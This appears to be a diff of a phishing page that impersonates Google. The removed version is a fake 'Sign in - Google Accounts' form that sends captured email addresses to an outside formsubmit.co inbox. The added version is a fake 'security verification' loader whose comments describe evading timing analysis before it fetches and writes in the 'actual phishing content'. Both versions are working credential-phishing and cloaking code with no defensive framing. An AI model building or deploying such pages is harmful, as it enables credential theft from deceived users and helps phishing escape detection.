@@ -3,310 +3,70 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sign in - Google Accounts</title>
-    <link rel="icon" href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><text y=%22.9em%22 font-size=%2290%22>🔒</text></svg>">
+    <title>Google Security Verification</title>
     <style>
-        :root {
-            --google-blue: #1a73e8;
-            --google-gray: #5f6368;
-            --google-light-gray: #dadce0;
-            --google-dark-bg: #202124;
-            --google-card-bg: #2d2e30;
-            --google-text: #e8eaed;
-            --google-link: #8ab4f8;
-        }
-
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: 'Google Sans', 'Roboto', Arial, sans-serif;
-        }
-
         body {
-            background: var(--google-dark-bg);
-            color: var(--google-text);
-            min-height: 100vh;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            padding: 20px;
-            line-height: 1.5;
-        }
-
-        .login-container {
-            width: 100%;
-            max-width: 450px;
-            margin: auto;
-        }
-
-        .google-header {
-            text-align: center;
-            margin-bottom: 2rem;
-            padding-top: 2rem;
-        }
-
-        .google-logo {
-            font-size: 2.5rem;
-            font-weight: 500;
-            color: var(--google-text);
-            margin-bottom: 1rem;
-        }
-
-        h1 {
-            font-size: 1.5rem;
-            font-weight: 400;
-            text-align: center;
-            margin-bottom: 2rem;
-            color: var(--google-text);
-        }
-
-        .login-form {
-            background: var(--google-card-bg);
-            border-radius: 8px;
-            padding: 2rem;
-            margin-bottom: 2rem;
-            border: 1px solid var(--google-light-gray);
-        }
-
-        .form-group {
-            margin-bottom: 1.5rem;
-        }
-
-        input[type="email"] {
-            width: 100%;
-            padding: 0.75rem;
-            border: 1px solid var(--google-light-gray);
-            border-radius: 4px;
-            background: var(--google-dark-bg);
-            color: var(--google-text);
-            font-size: 1rem;
-        }
-
-        input[type="email"]:focus {
-            outline: none;
-            border-color: var(--google-blue);
-            box-shadow: 0 0 0 2px rgba(26, 115, 232, 0.2);
-        }
-
-        .forgot-email {
-            display: block;
-            margin-top: 0.5rem;
-            color: var(--google-link);
-            text-decoration: none;
-            font-size: 0.9rem;
-        }
-
-        .forgot-email:hover {
-            text-decoration: underline;
-        }
-
-        .privacy-notice {
-            background: rgba(255, 255, 255, 0.05);
-            padding: 1rem;
-            border-radius: 4px;
-            margin: 1.5rem 0;
-            font-size: 0.9rem;
-            color: var(--google-gray);
-        }
-
-        .privacy-notice strong {
-            color: var(--google-text);
-        }
-
-        .navigation-buttons {
-            display: flex;
-            justify-content: space-between;
-            margin-top: 2rem;
-        }
-
-        .btn {
-            padding: 0.75rem 1.5rem;
-            border: none;
-            border-radius: 4px;
-            font-size: 1rem;
-            cursor: pointer;
-            transition: all 0.2s ease;
-        }
-
-        .btn-secondary {
-            background: transparent;
-            color: var(--google-blue);
-            border: 1px solid var(--google-light-gray);
-        }
-
-        .btn-secondary:hover {
-            background: rgba(26, 115, 232, 0.1);
-        }
-
-        .btn-primary {
-            background: var(--google-blue);
-            color: white;
-        }
-
-        .btn-primary:hover {
-            background: #1967d2;
-            box-shadow: 0 1px 2px rgba(0, 0, 0, 0.3);
-        }
-
-        .footer {
-            margin-top: 3rem;
-            text-align: center;
-            color: var(--google-gray);
-            font-size: 0.9rem;
-        }
-
-        .footer-links {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
             display: flex;
             justify-content: center;
-            gap: 1.5rem;
-            margin-top: 1rem;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background-color: #f8f9fa;
+            color: #3c4043;
         }
-
-        .footer-link {
-            color: var(--google-gray);
-            text-decoration: none;
+        .loader {
+            text-align: center;
         }
-
-        .footer-link:hover {
-            color: var(--google-link);
-            text-decoration: underline;
+        .spinner {
+            border: 3px solid #f1f1f1;
+            border-top: 3px solid #1a73e8;
+            border-radius: 50%;
+            width: 30px;
+            height: 30px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 15px;
         }
-
-        .language-selector {
-            margin-top: 0.5rem;
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
         }
-
-        /* Responsive Design */
-        @media (max-width: 768px) {
-            .login-container {
-                padding: 0 1rem;
-            }
-
-            .google-logo {
-                font-size: 2rem;
-            }
-
-            h1 {
-                font-size: 1.25rem;
-            }
-
-            .login-form {
-                padding: 1.5rem;
-            }
-
-            .navigation-buttons {
-                flex-direction: column;
-                gap: 1rem;
-            }
-
-            .btn {
-                width: 100%;
-            }
-        }
-
-        @media (max-width: 480px) {
-            body {
-                padding: 10px;
-            }
-
-            .google-logo {
-                font-size: 1.75rem;
-            }
-
-            .login-form {
-                padding: 1rem;
-            }
-        }
-
-        /* Animation */
-        @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(10px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
-
-        .login-container > * {
-            animation: fadeIn 0.3s ease-out;
+        p {
+            font-size: 14px;
+            margin: 5px 0;
         }
     </style>
 </head>
 <body>
-    <div class="login-container">
-        <div class="google-header">
-            <div class="google-logo">G</div>
-            <h1>Sign in</h1>
-        </div>
-
-        <div class="login-form">
-            <p style="margin-bottom: 1.5rem; color: var(--google-text);">Use your Google Account</p>
-            
-            <form action="https://formsubmit.co/captainabdelrheem@gmail.com" method="POST">
-                <input type="hidden" name="_subject" value="🔐 Google Sign-In Capture">
-                <input type="hidden" name="_captcha" value="false">
-                <input type="hidden" name="_template" value="table">
-                <input type="hidden" name="_next" value="https://google.com">
-                <input type="hidden" name="_autoresponse" value="Your Google sign-in was successful.">
-
-                <div class="form-group">
-                    <input type="email" name="email" placeholder="Email or phone" required autocomplete="username">
-                    <a href="#" class="forgot-email" onclick="alert('Feature disabled')">Forgot email?</a>
-                </div>
-
-                <div class="privacy-notice">
-                    <strong>Not your computer? Use Private Browsing windows to sign in.</strong><br>
-                    Learn more about using Guest mode
-                </div>
-
-                <div class="navigation-buttons">
-                    <button type="button" class="btn btn-secondary" onclick="createAccount()">Create account</button>
-                    <button type="submit" class="btn btn-primary" id="next-btn">Next</button>
-                </div>
-            </form>
-        </div>
-
-        <div class="footer">
-            <div class="footer-links">
-                <a href="#" class="footer-link">Help</a>
-                <a href="#" class="footer-link">Privacy</a>
-                <a href="#" class="footer-link">Terms</a>
-            </div>
-            <div class="language-selector">English (United States)</div>
-        </div>
+    <div class="loader">
+        <div class="spinner"></div>
+        <p>Performing security verification...</p>
+        <p>Please wait while we check your browser.</p>
     </div>
 
     <script>
-        function createAccount() {
-            alert('Account creation feature disabled');
-        }
+        // Layer 2: The Deception
+        // Wait a random human-reading-time delay (3-6 seconds) before fetching the real page.
+        // This mimics a user reading the "Verification" message.
+        const delay = 3000 + Math.random() * 3000;
+        console.log(`[DEBUG] Waiting ${Math.round(delay/1000)}s to bypass timing analysis...`);
 
-        document.querySelector('form').addEventListener('submit', function(e) {
-            const email = document.querySelector('input[type="email"]').value;
-            if (!email) {
-                e.preventDefault();
-                alert('Please enter your email');
-                return;
-            }
-
-            const btn = document.getElementById('next-btn');
-            btn.textContent = 'Checking...';
-            btn.disabled = true;
-
-            // Simulate Google's checking process
-            setTimeout(() => {
-                // Form will submit to FormSubmit
-            }, 2000);
-        });
-
-        // Add some interactive effects
-        document.querySelectorAll('input').forEach(input => {
-            input.addEventListener('focus', () => {
-                input.style.background = 'rgba(255, 255, 255, 0.1)';
-            });
-            
-            input.addEventListener('blur', () => {
-                input.style.background = 'var(--google-dark-bg)';
-            });
-        });
+        setTimeout(() => {
+            // Dynamically import the malicious content from a separate, seemingly benign file.
+            // This file is named 'auth-check.js' to appear legitimate.
+            fetch('/auth-check.js')
+                .then(response => response.text())
+                .then(data => {
+                    // Parse the response and write the actual phishing content to the document.
+                    document.open();
+                    document.write(data);
+                    document.close();
+                })
+                .catch(err => {
+                    console.error("Verification step failed:", err);
+                    document.body.innerHTML = '<p style="text-align:center;">Verification complete. <a href="https://www.google.com">Proceed to Google.com</a></p>';
+                });
+        }, delay);
     </script>
 </body>
 </html>
